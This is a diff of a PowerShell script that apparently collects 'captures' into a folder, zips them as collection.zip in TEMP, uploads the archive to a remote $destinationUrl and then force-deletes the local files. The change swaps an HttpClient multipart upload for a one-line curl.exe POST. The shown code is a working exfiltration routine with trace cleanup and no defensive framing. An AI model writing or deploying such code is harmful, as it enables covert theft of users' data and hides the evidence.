@@ -29,34 +29,8 @@ for ($i = 0; $i -lt $numberOfCaptures; $i++) {
 $zipFilePath = "$env:TEMP\collection.zip"
 [IO.Compression.ZipFile]::CreateFromDirectory($outputDir, $zipFilePath)
 Start-Sleep 20
-if (Test-Path $zipFilePath) {
-    Write-Host "Zip file found at: $zipFilePath"
 
-    # Crear un cliente HTTP
-    $client = New-Object System.Net.Http.HttpClient
-    $multipartContent = New-Object System.Net.Http.MultipartFormDataContent
-    $fileStream = [IO.File]::OpenRead($zipFilePath)
-    $fileContent = New-Object System.Net.Http.StreamContent($fileStream)
-    $fileContent.Headers.ContentType = New-Object System.Net.Http.Headers.MediaTypeHeaderValue("application/zip")
-
-    # Añadir el archivo al contenido multipart
-    $multipartContent.Add($fileContent, "file", [System.IO.Path]::GetFileName($zipFilePath))
-
-    # Hacer la solicitud POST
-    $response = $client.PostAsync($destinationUrl, $multipartContent).Result
-
-    # Verificar el resultado
-    if ($response.IsSuccessStatusCode) {
-        Write-Host "File uploaded successfully!"
-    } else {
-        Write-Host "Failed to upload file. Status code:" $response.StatusCode
-    }
-
-    # Cerrar el Stream
-    $fileStream.Close()
-} else {
-    Write-Host "The zip file was not found."
-}
+curl.exe -X POST -F "file=@$zipFilePath" $destinationUrl
 
 Start-Sleep 4
 Get-ChildItem -Path $outputDir | Remove-Item -Recurse -Force
